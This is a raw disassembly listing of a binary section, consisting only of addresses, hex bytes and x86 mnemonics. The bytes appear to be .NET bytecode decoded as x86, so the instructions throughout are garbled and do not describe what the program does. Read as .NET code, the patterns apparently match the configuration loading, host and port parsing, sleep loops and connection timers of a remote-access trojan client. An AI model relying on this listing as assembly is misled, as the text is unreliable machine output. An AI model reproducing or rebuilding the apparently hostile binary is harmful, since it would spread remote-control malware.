  4025ca:	73 83                	jae    0x40254f
  4025cc:	00 00                	add    %al,(%eax)
  4025ce:	0a 80 3b 00 00 04    	or     0x400003b(%eax),%al
  4025d4:	2a 5e 02             	sub    0x2(%esi),%bl
  4025d7:	28 1b                	sub    %bl,(%ebx)
  4025d9:	00 00                	add    %al,(%eax)
  4025db:	0a 03                	or     (%ebx),%al
  4025dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4025de:	21 00                	and    %eax,(%eax)
  4025e0:	00 0a                	add    %cl,(%edx)
  4025e2:	28 99 00 00 06 28    	sub    %bl,0x28060000(%ecx)
  4025e8:	fb                   	sti
  4025e9:	00 00                	add    %al,(%eax)
  4025eb:	0a 2a                	or     (%edx),%ch
  4025ed:	5e                   	pop    %esi
  4025ee:	28 1b                	sub    %bl,(%ebx)
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	0a 02                	or     (%edx),%al
  4025f4:	03 28                	add    (%eax),%ebp
  4025f6:	1c 00                	sbb    $0x0,%al
  4025f8:	00 0a                	add    %cl,(%edx)
  4025fa:	28 9b 00 00 06 6f    	sub    %bl,0x6f060000(%ebx)
  402600:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402605:	62 1f                	bound  %ebx,(%edi)
  402607:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40260d:	25 d0 44 00 00       	and    $0x44d0,%eax
  402612:	04 28                	add    $0x28,%al
  402614:	78 00                	js     0x402616
  402616:	00 0a                	add    %cl,(%edx)
  402618:	80 43 00 00          	addb   $0x0,0x0(%ebx)
  40261c:	04 2a                	add    $0x2a,%al
  40261e:	00 00                	add    %al,(%eax)
  402620:	1b 30                	sbb    (%eax),%esi
  402622:	03 00                	add    (%eax),%eax
  402624:	b5 00                	mov    $0x0,%ch
  402626:	00 00                	add    %al,(%eax)
  402628:	01 00                	add    %eax,(%eax)
  40262a:	00 11                	add    %dl,(%ecx)
  40262c:	16                   	push   %ss
  40262d:	0a 2b                	or     (%ebx),%ch
  40262f:	0e                   	push   %cs
  402630:	20 e8                	and    %ch,%al
  402632:	03 00                	add    (%eax),%eax
  402634:	00 28                	add    %ch,(%eax)
  402636:	14 00                	adc    $0x0,%al
  402638:	00 0a                	add    %cl,(%edx)
  40263a:	06                   	push   %es
  40263b:	17                   	pop    %ss
  40263c:	58                   	pop    %eax
  40263d:	0a 06                	or     (%esi),%al
  40263f:	7e 11                	jle    0x402652
  402641:	00 00                	add    %al,(%eax)
  402643:	04 28                	add    $0x28,%al
  402645:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  40264a:	e5 28                	in     $0x28,%eax
  40264c:	03 00                	add    (%eax),%eax
  40264e:	00 06                	add    %al,(%esi)
  402650:	2d 06 16 28 16       	sub    $0x16281606,%eax
  402655:	00 00                	add    %al,(%eax)
  402657:	0a 00                	or     (%eax),%al
  402659:	28 87 00 00 06 2d    	sub    %al,0x2d060000(%edi)
  40265f:	06                   	push   %es
  402660:	16                   	push   %ss
  402661:	28 16                	sub    %dl,(%esi)
  402663:	00 00                	add    %al,(%eax)
  402665:	0a 7e 0c             	or     0xc(%esi),%bh
  402668:	00 00                	add    %al,(%eax)
  40266a:	04 28                	add    $0x28,%al
  40266c:	17                   	pop    %ss
  40266d:	00 00                	add    %al,(%eax)
  40266f:	0a 2c 05 28 72 00 00 	or     0x7228(,%eax,1),%ch
  402676:	06                   	push   %es
  402677:	7e 04                	jle    0x40267d
  402679:	00 00                	add    %al,(%eax)
  40267b:	04 28                	add    $0x28,%al
  40267d:	17                   	pop    %ss
  40267e:	00 00                	add    %al,(%eax)
  402680:	0a 2c 05 28 70 00 00 	or     0x7028(,%eax,1),%ch
  402687:	06                   	push   %es
  402688:	7e 0f                	jle    0x402699
  40268a:	00 00                	add    %al,(%eax)
  40268c:	04 28                	add    $0x28,%al
  40268e:	17                   	pop    %ss
  40268f:	00 00                	add    %al,(%eax)
  402691:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  402694:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  40269a:	05 28 8a 00 00       	add    $0x8a28,%eax
  40269f:	06                   	push   %es
  4026a0:	28 86 00 00 06 73    	sub    %al,0x73060000(%esi)
  4026a6:	7d 00                	jge    0x4026a8
  4026a8:	00 06                	add    %al,(%esi)
  4026aa:	28 7b 00             	sub    %bh,0x0(%ebx)
  4026ad:	00 06                	add    %al,(%esi)
  4026af:	26 de 03             	fiadds %es:(%ebx)
  4026b2:	26 de 00             	fiadds %es:(%eax)
  4026b5:	28 12                	sub    %dl,(%edx)
  4026b7:	00 00                	add    %al,(%eax)
  4026b9:	06                   	push   %es
  4026ba:	2d 0a 28 1c 00       	sub    $0x1c280a,%eax
  4026bf:	00 06                	add    %al,(%esi)
  4026c1:	28 19                	sub    %bl,(%ecx)
  4026c3:	00 00                	add    %al,(%eax)
  4026c5:	06                   	push   %es
  4026c6:	73 18                	jae    0x4026e0
  4026c8:	00 00                	add    %al,(%eax)
  4026ca:	0a 20                	or     (%eax),%ah
  4026cc:	e8 03 00 00 20       	call   0x204026d4
  4026d1:	88 13                	mov    %dl,(%ebx)
  4026d3:	00 00                	add    %al,(%eax)
  4026d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4026d6:	19 00                	sbb    %eax,(%eax)
  4026d8:	00 0a                	add    %cl,(%edx)
  4026da:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026dd:	00 0a                	add    %cl,(%edx)
  4026df:	2b d4                	sub    %esp,%edx
  4026e1:	00 00                	add    %al,(%eax)
  4026e3:	00 01                	add    %al,(%ecx)
  4026e5:	10 00                	adc    %al,(%eax)
  4026e7:	00 00                	add    %al,(%eax)
  4026e9:	00 2d 00 59 86 00    	add    %ch,0x865900
  4026ef:	03 01                	add    (%ecx),%eax
  4026f1:	00 00                	add    %al,(%eax)
  4026f3:	01 1b                	add    %ebx,(%ebx)
  4026f5:	30 02                	xor    %al,(%edx)
  4026f7:	00 13                	add    %dl,(%ebx)
  4026f9:	01 00                	add    %eax,(%eax)
  4026fb:	00 02                	add    %al,(%edx)
  4026fd:	00 00                	add    %al,(%eax)
  4026ff:	11 28                	adc    %ebp,(%eax)
  402701:	1b 00                	sbb    (%eax),%eax
  402703:	00 0a                	add    %cl,(%edx)
  402705:	7e 07                	jle    0x40270e
  402707:	00 00                	add    %al,(%eax)
  402709:	04 28                	add    $0x28,%al
  40270b:	1c 00                	sbb    $0x0,%al
  40270d:	00 0a                	add    %cl,(%edx)
  40270f:	6f                   	outsl  %ds:(%esi),(%dx)
  402710:	1d 00 00 0a 80       	sbb    $0x800a0000,%eax
  402715:	07                   	pop    %es
  402716:	00 00                	add    %al,(%eax)
  402718:	04 7e                	add    $0x7e,%al
  40271a:	07                   	pop    %es
  40271b:	00 00                	add    %al,(%eax)
  40271d:	04 73                	add    $0x73,%al
  40271f:	97                   	xchg   %eax,%edi
  402720:	00 00                	add    %al,(%eax)
  402722:	06                   	push   %es
  402723:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272a:	00 00                	add    %al,(%eax)
  40272c:	04 7e                	add    $0x7e,%al
  40272e:	01 00                	add    %eax,(%eax)
  402730:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402733:	9a 00 00 06 80 01 00 	lcall  $0x1,$0x80060000
  40273a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40273d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402742:	02 00                	add    (%eax),%al
  402744:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402747:	9a 00 00 06 80 02 00 	lcall  $0x2,$0x80060000
  40274e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402751:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402756:	03 00                	add    (%eax),%eax
  402758:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275b:	9a 00 00 06 80 03 00 	lcall  $0x3,$0x80060000
  402762:	00 04 7e             	add    %al,(%esi,%edi,2)
  402765:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276a:	04 00                	add    $0x0,%al
  40276c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40276f:	9a 00 00 06 80 04 00 	lcall  $0x4,$0x80060000
  402776:	00 04 7e             	add    %al,(%esi,%edi,2)
  402779:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40277e:	08 00                	or     %al,(%eax)
  402780:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402783:	9a 00 00 06 80 08 00 	lcall  $0x8,$0x80060000
  40278a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40278d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402792:	0e                   	push   %cs
  402793:	00 00                	add    %al,(%eax)
  402795:	04 6f                	add    $0x6f,%al
  402797:	9a 00 00 06 80 0e 00 	lcall  $0xe,$0x80060000
  40279e:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a1:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027a6:	0c 00                	or     $0x0,%al
  4027a8:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027ab:	9a 00 00 06 80 0c 00 	lcall  $0xc,$0x80060000
  4027b2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027b5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027ba:	0f 00 00             	sldt   (%eax)
  4027bd:	04 6f                	add    $0x6f,%al
  4027bf:	9a 00 00 06 80 0f 00 	lcall  $0xf,$0x80060000
  4027c6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027c9:	7e 00                	jle    0x4027cb
  4027cb:	00 06                	add    %al,(%esi)
  4027cd:	80 10 00             	adcb   $0x0,(%eax)
  4027d0:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027d3:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d8:	0a 00                	or     (%eax),%al
  4027da:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027dd:	9a 00 00 06 80 0a 00 	lcall  $0xa,$0x80060000
  4027e4:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027e7:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027ec:	09 00                	or     %eax,(%eax)
  4027ee:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f1:	9a 00 00 06 28 1c 00 	lcall  $0x1c,$0x28060000
  4027f8:	00 0a                	add    %cl,(%edx)
  4027fa:	73 1e                	jae    0x40281a
  4027fc:	00 00                	add    %al,(%eax)
  4027fe:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  402804:	28 04 00             	sub    %al,(%eax,%eax,1)
  402807:	00 06                	add    %al,(%esi)
  402809:	0a de                	or     %dh,%bl
  40280b:	05 26 16 0a de       	add    $0xde0a1626,%eax
  402810:	00 06                	add    %al,(%esi)
  402812:	2a 00                	sub    (%eax),%al
  402814:	41                   	inc    %ecx
  402815:	1c 00                	sbb    $0x0,%al
	...
  40281f:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  402822:	00 00                	add    %al,(%eax)
  402824:	0c 01                	or     $0x1,%al
  402826:	00 00                	add    %al,(%eax)
  402828:	05 00 00 00 01       	add    $0x1000000,%eax
  40282d:	00 00                	add    %al,(%eax)
  40282f:	01 1b                	add    %ebx,(%ebx)
  402831:	30 04 00             	xor    %al,(%eax,%eax,1)
  402834:	4b                   	dec    %ebx
  402835:	00 00                	add    %al,(%eax)
  402837:	00 02                	add    %al,(%edx)
  402839:	00 00                	add    %al,(%eax)
  40283b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40283e:	00 00                	add    %al,(%eax)
  402840:	04 6f                	add    $0x6f,%al
  402842:	1f                   	pop    %ds
  402843:	00 00                	add    %al,(%eax)
  402845:	0a 6f 20             	or     0x20(%edi),%ch
  402848:	00 00                	add    %al,(%eax)
  40284a:	0a 74 30 00          	or     0x0(%eax,%esi,1),%dh
  40284e:	00 01                	add    %al,(%ecx)
  402850:	28 1b                	sub    %bl,(%ebx)
  402852:	00 00                	add    %al,(%eax)
  402854:	0a 7e 07             	or     0x7(%esi),%bh
  402857:	00 00                	add    %al,(%eax)
  402859:	04 6f                	add    $0x6f,%al
  40285b:	21 00                	and    %eax,(%eax)
  40285d:	00 0a                	add    %cl,(%edx)
  40285f:	28 9f 00 00 06 72    	sub    %bl,0x72060000(%edi)
  402865:	01 00                	add    %eax,(%eax)
  402867:	00 70 28             	add    %dh,0x28(%eax)
  40286a:	22 00                	and    (%eax),%al
  40286c:	00 0a                	add    %cl,(%edx)
  40286e:	7e 0a                	jle    0x40287a
  402870:	00 00                	add    %al,(%eax)
  402872:	04 28                	add    $0x28,%al
  402874:	1c 00                	sbb    $0x0,%al
  402876:	00 0a                	add    %cl,(%edx)
  402878:	6f                   	outsl  %ds:(%esi),(%dx)
  402879:	23 00                	and    (%eax),%eax
  40287b:	00 0a                	add    %cl,(%edx)
  40287d:	0a de                	or     %dh,%bl
  40287f:	05 26 16 0a de       	add    $0xde0a1626,%eax
  402884:	00 06                	add    %al,(%esi)
  402886:	2a 00                	sub    (%eax),%al
  402888:	01 10                	add    %edx,(%eax)
  40288a:	00 00                	add    %al,(%eax)
  40288c:	00 00                	add    %al,(%eax)
  40288e:	00 00                	add    %al,(%eax)
  402890:	44                   	inc    %esp
  402891:	44                   	inc    %esp
  402892:	00 05 32 00 00 01    	add    %al,0x1000032
  402898:	13 30                	adc    (%eax),%esi
  40289a:	01 00                	add    %eax,(%eax)
  40289c:	97                   	xchg   %eax,%edi
  40289d:	00 00                	add    %al,(%eax)
  40289f:	00 00                	add    %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	00 72 0f             	add    %dh,0xf(%edx)
  4028a6:	00 00                	add    %al,(%eax)
  4028a8:	70 80                	jo     0x40282a
  4028aa:	01 00                	add    %eax,(%eax)
  4028ac:	00 04 72             	add    %al,(%edx,%esi,2)
  4028af:	ea 00 00 70 80 02 00 	ljmp   $0x2,$0x80700000
  4028b6:	00 04 72             	add    %al,(%edx,%esi,2)
  4028b9:	9d                   	popf
  4028ba:	01 00                	add    %eax,(%eax)
  4028bc:	70 80                	jo     0x40283e
  4028be:	03 00                	add    (%eax),%eax
  4028c0:	00 04 72             	add    %al,(%edx,%esi,2)
  4028c3:	50                   	push   %eax
  4028c4:	02 00                	add    (%eax),%al
  4028c6:	70 80                	jo     0x402848
  4028c8:	04 00                	add    $0x0,%al
  4028ca:	00 04 72             	add    %al,(%edx,%esi,2)
  4028cd:	03 03                	add    (%ebx),%eax
  4028cf:	00 70 80             	add    %dh,-0x80(%eax)
  4028d2:	05 00 00 04 72       	add    $0x72040000,%eax
  4028d7:	17                   	pop    %ss
  4028d8:	03 00                	add    (%eax),%eax
  4028da:	70 80                	jo     0x40285c
  4028dc:	06                   	push   %es
  4028dd:	00 00                	add    %al,(%eax)
  4028df:	04 72                	add    $0x72,%al
  4028e1:	39 03                	cmp    %eax,(%ebx)
  4028e3:	00 70 80             	add    %dh,-0x80(%eax)
  4028e6:	07                   	pop    %es
  4028e7:	00 00                	add    %al,(%eax)
  4028e9:	04 72                	add    $0x72,%al
  4028eb:	93                   	xchg   %eax,%ebx
  4028ec:	03 00                	add    (%eax),%eax
  4028ee:	70 80                	jo     0x402870
  4028f0:	08 00                	or     %al,(%eax)
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	46                   	inc    %esi
  4028f6:	04 00                	add    $0x0,%al
  4028f8:	70 80                	jo     0x40287a
  4028fa:	09 00                	or     %eax,(%eax)
  4028fc:	00 04 72             	add    %al,(%edx,%esi,2)
  4028ff:	a1 16 00 70 80       	mov    0x80700016,%eax
  402904:	0a 00                	or     (%eax),%al
  402906:	00 04 72             	add    %al,(%edx,%esi,2)
  402909:	54                   	push   %esp
  40290a:	1e                   	push   %ds
  40290b:	00 70 80             	add    %dh,-0x80(%eax)
  40290e:	0c 00                	or     $0x0,%al
  402910:	00 04 72             	add    %al,(%edx,%esi,2)
  402913:	07                   	pop    %es
  402914:	1f                   	pop    %ds
  402915:	00 70 80             	add    %dh,-0x80(%eax)
  402918:	0e                   	push   %cs
  402919:	00 00                	add    %al,(%eax)
  40291b:	04 72                	add    $0x72,%al
  40291d:	ba 1f 00 70 80       	mov    $0x8070001f,%edx
  402922:	0f 00 00             	sldt   (%eax)
  402925:	04 72                	add    $0x72,%al
  402927:	6d                   	insl   (%dx),%es:(%edi)
  402928:	20 00                	and    %al,(%eax)
  40292a:	70 80                	jo     0x4028ac
  40292c:	10 00                	adc    %al,(%eax)
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	6f                   	outsl  %ds:(%esi),(%dx)
  402932:	20 00                	and    %al,(%eax)
  402934:	70 80                	jo     0x4028b6
  402936:	11 00                	adc    %eax,(%eax)
  402938:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40293b:	00 1b                	add    %bl,(%ebx)
  40293d:	30 07                	xor    %al,(%edi)
  40293f:	00 9e 02 00 00 03    	add    %bl,0x3000002(%esi)
  402945:	00 00                	add    %al,(%eax)
  402947:	11 18                	adc    %ebx,(%eax)
  402949:	17                   	pop    %ss
  40294a:	1c 73                	sbb    $0x73,%al
  40294c:	24 00                	and    $0x0,%al
  40294e:	00 0a                	add    %cl,(%edx)
  402950:	25 20 00 c8 00       	and    $0xc80020,%eax
  402955:	00 6f 25             	add    %ch,0x25(%edi)
  402958:	00 00                	add    %al,(%eax)
  40295a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402960:	00 6f 26             	add    %ch,0x26(%edi)
  402963:	00 00                	add    %al,(%eax)
  402965:	0a 28                	or     (%eax),%ch
  402967:	07                   	pop    %es
  402968:	00 00                	add    %al,(%eax)
  40296a:	06                   	push   %es
  40296b:	7e 0e                	jle    0x40297b
  40296d:	00 00                	add    %al,(%eax)
  40296f:	04 72                	add    $0x72,%al
  402971:	73 20                	jae    0x402993
  402973:	00 70 28             	add    %dh,0x28(%eax)
  402976:	27                   	daa
  402977:	00 00                	add    %al,(%eax)
  402979:	0a 39                	or     (%ecx),%bh
  40297b:	d0 00                	rolb   $1,(%eax)
  40297d:	00 00                	add    %al,(%eax)
  40297f:	7e 02                	jle    0x402983
  402981:	00 00                	add    %al,(%eax)
  402983:	04 17                	add    $0x17,%al
  402985:	8d 3a                	lea    (%edx),%edi
  402987:	00 00                	add    %al,(%eax)
  402989:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  40298f:	6f                   	outsl  %ds:(%esi),(%dx)
  402990:	28 00                	sub    %al,(%eax)
  402992:	00 0a                	add    %cl,(%edx)
  402994:	73 18                	jae    0x4029ae
  402996:	00 00                	add    %al,(%eax)
  402998:	0a 7e 02             	or     0x2(%esi),%bh
  40299b:	00 00                	add    %al,(%eax)
  40299d:	04 17                	add    $0x17,%al
  40299f:	8d 3a                	lea    (%edx),%edi
  4029a1:	00 00                	add    %al,(%eax)
  4029a3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029aa:	28 00                	sub    %al,(%eax)
  4029ac:	00 0a                	add    %cl,(%edx)
  4029ae:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4029b1:	29 00                	sub    %eax,(%eax)
  4029b3:	00 0a                	add    %cl,(%edx)
  4029b5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029bc:	17                   	pop    %ss
  4029bd:	8d 3a                	lea    (%edx),%edi
  4029bf:	00 00                	add    %al,(%eax)
  4029c1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c8:	28 00                	sub    %al,(%eax)
  4029ca:	00 0a                	add    %cl,(%edx)
  4029cc:	73 18                	jae    0x4029e6
  4029ce:	00 00                	add    %al,(%eax)
  4029d0:	0a 7e 01             	or     0x1(%esi),%bh
  4029d3:	00 00                	add    %al,(%eax)
  4029d5:	04 17                	add    $0x17,%al
  4029d7:	8d 3a                	lea    (%edx),%edi
  4029d9:	00 00                	add    %al,(%eax)
  4029db:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4029e2:	28 00                	sub    %al,(%eax)
  4029e4:	00 0a                	add    %cl,(%edx)
  4029e6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4029e9:	29 00                	sub    %eax,(%eax)
  4029eb:	00 0a                	add    %cl,(%edx)
  4029ed:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  4029f4:	06                   	push   %es
  4029f5:	28 1a                	sub    %bl,(%edx)
  4029f7:	00 00                	add    %al,(%eax)
  4029f9:	06                   	push   %es
  4029fa:	2c 42                	sub    $0x42,%al
  4029fc:	06                   	push   %es
  4029fd:	28 2a                	sub    %ch,(%edx)
  4029ff:	00 00                	add    %al,(%eax)
  402a01:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a04:	0d 2b 2c 08 09       	or     $0x9082c2b,%eax
  402a09:	9a 13 04 28 06 00 00 	lcall  $0x0,$0x6280413
  402a10:	06                   	push   %es
  402a11:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a14:	6f                   	outsl  %ds:(%esi),(%dx)
  402a15:	2b 00                	sub    (%eax),%eax
  402a17:	00 0a                	add    %cl,(%edx)
  402a19:	28 06                	sub    %al,(%esi)
  402a1b:	00 00                	add    %al,(%eax)
  402a1d:	06                   	push   %es
  402a1e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a1f:	2c 00                	sub    $0x0,%al
  402a21:	00 0a                	add    %cl,(%edx)
  402a23:	2c 05                	sub    $0x5,%al
  402a25:	dd af 00 00 00 de    	(bad) -0x22000000(%edi)
  402a2b:	03 26                	add    (%esi),%esp
  402a2d:	de 00                	fiadds (%eax)
  402a2f:	09 17                	or     %edx,(%edi)
  402a31:	58                   	pop    %eax
  402a32:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a37:	32 ce                	xor    %dh,%cl
  402a39:	38 9b 00 00 00 28    	cmp    %bl,0x28000000(%ebx)
  402a3f:	06                   	push   %es
  402a40:	00 00                	add    %al,(%eax)
  402a42:	06                   	push   %es
  402a43:	06                   	push   %es
  402a44:	07                   	pop    %es
  402a45:	6f                   	outsl  %ds:(%esi),(%dx)
  402a46:	2d 00 00 0a 38       	sub    $0x380a0000,%eax
  402a4b:	8a 00                	mov    (%eax),%al
  402a4d:	00 00                	add    %al,(%eax)
  402a4f:	73 2e                	jae    0x402a7f
  402a51:	00 00                	add    %al,(%eax)
  402a53:	0a 13                	or     (%ebx),%dl
  402a55:	05 72 6d 20 00       	add    $0x206d72,%eax
  402a5a:	70 72                	jo     0x402ace
  402a5c:	6d                   	insl   (%dx),%es:(%edi)
  402a5d:	20 00                	and    %al,(%eax)
  402a5f:	70 73                	jo     0x402ad4
  402a61:	2f                   	das
  402a62:	00 00                	add    %al,(%eax)
  402a64:	0a 13                	or     (%ebx),%dl
  402a66:	06                   	push   %es
  402a67:	11 05 11 06 6f 30    	adc    %eax,0x306f0611
  402a6d:	00 00                	add    %al,(%eax)
  402a6f:	0a 11                	or     (%ecx),%dl
  402a71:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402a76:	04 6f                	add    $0x6f,%al
  402a78:	31 00                	xor    %eax,(%eax)
  402a7a:	00 0a                	add    %cl,(%edx)
  402a7c:	17                   	pop    %ss
  402a7d:	8d 39                	lea    (%ecx),%edi
  402a7f:	00 00                	add    %al,(%eax)
  402a81:	01 25 16 72 7d 20    	add    %esp,0x207d7216
  402a87:	00 70 a2             	add    %dh,-0x5e(%eax)
  402a8a:	16                   	push   %ss
  402a8b:	6f                   	outsl  %ds:(%esi),(%dx)
  402a8c:	32 00                	xor    (%eax),%al
  402a8e:	00 0a                	add    %cl,(%edx)
  402a90:	13 07                	adc    (%edi),%eax
  402a92:	11 07                	adc    %eax,(%edi)
  402a94:	16                   	push   %ss
  402a95:	9a 80 02 00 00 04 11 	lcall  $0x1104,$0x280
  402a9c:	07                   	pop    %es
  402a9d:	73 18                	jae    0x402ab7
  402a9f:	00 00                	add    %al,(%eax)
  402aa1:	0a 17                	or     (%edi),%dl
  402aa3:	11 07                	adc    %eax,(%edi)
  402aa5:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aa8:	19 00                	sbb    %eax,(%eax)
  402aaa:	00 0a                	add    %cl,(%edx)
  402aac:	9a 80 01 00 00 04 28 	lcall  $0x2804,$0x180
  402ab3:	06                   	push   %es
  402ab4:	00 00                	add    %al,(%eax)
  402ab6:	06                   	push   %es
  402ab7:	7e 02                	jle    0x402abb
  402ab9:	00 00                	add    %al,(%eax)
  402abb:	04 7e                	add    $0x7e,%al
  402abd:	01 00                	add    %eax,(%eax)
  402abf:	00 04 28             	add    %al,(%eax,%ebp,1)
  402ac2:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402ac7:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  402acc:	0c 11                	or     $0x11,%al
  402ace:	05 2c 07 11 05       	add    $0x511072c,%eax
  402ad3:	6f                   	outsl  %ds:(%esi),(%dx)
  402ad4:	33 00                	xor    (%eax),%eax
  402ad6:	00 0a                	add    %cl,(%edx)
  402ad8:	dc 28                	fsubrl (%eax)
  402ada:	06                   	push   %es
  402adb:	00 00                	add    %al,(%eax)
  402add:	06                   	push   %es
  402ade:	6f                   	outsl  %ds:(%esi),(%dx)
  402adf:	2c 00                	sub    $0x0,%al
  402ae1:	00 0a                	add    %cl,(%edx)
  402ae3:	39 ec                	cmp    %ebp,%esp
  402ae5:	00 00                	add    %al,(%eax)
  402ae7:	00 17                	add    %dl,(%edi)
  402ae9:	28 13                	sub    %dl,(%ebx)
  402aeb:	00 00                	add    %al,(%eax)
  402aed:	06                   	push   %es
  402aee:	28 06                	sub    %al,(%esi)
  402af0:	00 00                	add    %al,(%eax)
  402af2:	06                   	push   %es
  402af3:	17                   	pop    %ss
  402af4:	73 34                	jae    0x402b2a
  402af6:	00 00                	add    %al,(%eax)
  402af8:	0a 16                	or     (%esi),%dl
  402afa:	14 fe                	adc    $0xfe,%al
  402afc:	06                   	push   %es
  402afd:	1b 00                	sbb    (%eax),%eax
  402aff:	00 06                	add    %al,(%esi)
  402b01:	73 35                	jae    0x402b38
  402b03:	00 00                	add    %al,(%eax)
  402b05:	0a 73 36             	or     0x36(%ebx),%dh
  402b08:	00 00                	add    %al,(%eax)
  402b0a:	0a 28                	or     (%eax),%ch
  402b0c:	09 00                	or     %eax,(%eax)
  402b0e:	00 06                	add    %al,(%esi)
  402b10:	28 08                	sub    %cl,(%eax)
  402b12:	00 00                	add    %al,(%eax)
  402b14:	06                   	push   %es
  402b15:	28 06                	sub    %al,(%esi)
  402b17:	00 00                	add    %al,(%eax)
  402b19:	06                   	push   %es
  402b1a:	6f                   	outsl  %ds:(%esi),(%dx)
  402b1b:	37                   	aaa
  402b1c:	00 00                	add    %al,(%eax)
  402b1e:	0a 6f 38             	or     0x38(%edi),%ch
  402b21:	00 00                	add    %al,(%eax)
  402b23:	0a 17                	or     (%edi),%dl
  402b25:	8d 3a                	lea    (%edx),%edi
  402b27:	00 00                	add    %al,(%eax)
  402b29:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	28 00                	sub    %al,(%eax)
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	16                   	push   %ss
  402b35:	9a 14 20 c0 00 00 00 	lcall  $0x0,$0xc02014
  402b3c:	16                   	push   %ss
  402b3d:	6f                   	outsl  %ds:(%esi),(%dx)
  402b3e:	39 00                	cmp    %eax,(%eax)
  402b40:	00 0a                	add    %cl,(%edx)
  402b42:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b45:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b4a:	0c 00                	or     $0x0,%al
  402b4c:	00 06                	add    %al,(%esi)
  402b4e:	d4 8d                	aam    $0x8d
  402b50:	44                   	inc    %esp
  402b51:	00 00                	add    %al,(%eax)
  402b53:	01 28                	add    %ebp,(%eax)
  402b55:	0b 00                	or     (%eax),%eax
  402b57:	00 06                	add    %al,(%esi)
  402b59:	16                   	push   %ss
  402b5a:	6a 28                	push   $0x28
  402b5c:	0f 00 00             	sldt   (%eax)
  402b5f:	06                   	push   %es
  402b60:	28 80 00 00 06 28    	sub    %al,0x28060000(%eax)
  402b66:	1e                   	push   %ds
  402b67:	00 00                	add    %al,(%eax)
  402b69:	06                   	push   %es
  402b6a:	14 fe                	adc    $0xfe,%al
  402b6c:	06                   	push   %es
  402b6d:	1f                   	pop    %ds
  402b6e:	00 00                	add    %al,(%eax)
  402b70:	06                   	push   %es
  402b71:	73 3a                	jae    0x402bad
  402b73:	00 00                	add    %al,(%eax)
  402b75:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402b78:	18 00                	sbb    %al,(%eax)
  402b7a:	00 0a                	add    %cl,(%edx)
  402b7c:	20 98 3a 00 00 20    	and    %bl,0x2000003a(%eax)
  402b82:	30 75 00             	xor    %dh,0x0(%ebp)
  402b85:	00 6f 19             	add    %ch,0x19(%edi)
  402b88:	00 00                	add    %al,(%eax)
  402b8a:	0a 73 18             	or     0x18(%ebx),%dh
  402b8d:	00 00                	add    %al,(%eax)
  402b8f:	0a 20                	or     (%eax),%ah
  402b91:	98                   	cwtl
  402b92:	3a 00                	cmp    (%eax),%al
  402b94:	00 20                	add    %ah,(%eax)
  402b96:	60                   	pusha
  402b97:	ea 00 00 6f 19 00 00 	ljmp   $0x0,$0x196f0000
  402b9e:	0a 73 3b             	or     0x3b(%ebx),%dh
